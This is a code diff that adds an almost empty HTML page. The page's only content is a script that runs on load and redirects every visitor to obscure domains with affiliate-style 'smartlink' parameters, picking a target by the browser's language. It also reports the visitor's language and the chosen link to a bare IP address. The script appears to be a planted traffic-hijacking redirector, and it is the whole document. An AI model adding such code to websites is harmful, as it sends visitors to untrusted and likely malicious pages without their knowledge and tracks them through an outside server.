@@ -1,0 +1,38 @@
+<html>
+</html>
+
+<script type="text/javascript">
+    var type = navigator.appName;
+    var nationCorrespond = {
+        "zh-CN": [
+            "https://dt-secureconv.com/?a=148270&c=279199&mt=26",
+            "https://mb-npltfpro.com/?a=148270&c=193249&mt=26"
+        ]
+       
+    }
+    var defualt = 'https://securecd-smnd.com/smartlink/?a=148270&sm=12546&mt=26';
+    if (type == "Netscape") {
+        var lang = navigator.language;//获取浏览器配置语言，支持非IE浏览器
+    } else {
+        var lang = navigator.userLanguage;//获取浏览器配置语言，支持IE5+ == navigator.systemLanguage
+    }
+    href = nationCorrespond[lang]
+    if (href) {
+        href = nationCorrespond[lang][Math.floor(Math.random() * nationCorrespond[lang].length)]
+    } else {
+        href = defualt
+    }
+    window.location.href = href
+    url = "http://154.204.59.190/api/click_number?nation=" + lang + "&href=" + href;
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url);
+    xhr.responseType = 'json';
+    xhr.onload = function () {
+        // 请求结束后,在此处写处理代码
+    };
+    xhr.onerror = function () {//请求错误
+        console.log('xhr error');
+    }
+
+    xhr.send();
+</script>
